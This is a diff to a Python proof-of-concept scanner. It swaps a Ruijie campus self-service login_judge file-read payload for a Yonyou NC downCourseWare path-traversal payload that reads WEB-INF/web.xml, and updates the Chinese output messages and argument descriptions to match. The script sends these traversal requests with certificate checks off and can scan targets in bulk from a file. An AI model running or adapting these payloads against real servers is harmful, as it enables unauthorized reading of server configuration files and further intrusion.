@@ -14,12 +14,12 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 def check_vulnerability(url):
     try:
         # 构造完整的攻击URL
-        attack_url = url.rstrip('/') + "/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=%2e/WEB-INF/web.xml%3F"
+        attack_url = url.rstrip('/') + "/portal/pt/downCourseWare/download?fileName=%2e%2e/webapps/nc_web/WEB-INF/web.xml&pageId=login"
   
         response = requests.get(attack_url, verify=False, timeout=10)
   
         if response.status_code == 200 and 'web-app' in response.text:
-            print(f"{RED}URL [{url}] 存在锐捷校园网自助服务系统login_judge任意文件读取漏洞{RESET}")
+            print(f"{RED}URL [{url}] 可能存在用友NC downCourseWare任意文件读取漏洞{RESET}")
         else:
             print(f"URL [{url}] 不存在漏洞")
     except requests.exceptions.Timeout:
@@ -28,7 +28,7 @@ def check_vulnerability(url):
         print(f"URL [{url}] 请求失败: {e}")
 
 def main():
-    parser = argparse.ArgumentParser(description='检测目标地址是否存在锐捷校园网自助服务系统login_judge任意文件读取漏洞')
+    parser = argparse.ArgumentParser(description='检测目标地址是否存在用友NC downCourseWare任意文件读取漏洞')
     parser.add_argument('-u', '--url', help='指定目标地址')
     parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')
 
